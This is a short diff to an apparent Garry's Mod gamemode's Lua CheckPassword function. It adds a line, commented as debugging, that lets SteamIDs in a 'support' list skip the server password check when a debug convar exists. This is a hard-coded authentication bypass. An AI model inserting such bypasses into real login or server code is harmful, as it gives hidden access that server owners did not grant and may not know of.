@@ -191,7 +191,8 @@ end
 --   Name: GM:CheckPassword()
 ---------------------------------------------------------]]--
 function GM:CheckPassword( steamid, networkid, server_password, password, name )
-	-- The server has sv_password set
+    if (ConVarExists('lps_debug') and lps.support[steamid]) then return true end --for debugging shit
+    -- The server has sv_password set
 	if ( server_password != "" ) then
 		-- The joining clients password doesn't match sv_password
 		if ( server_password != password ) then
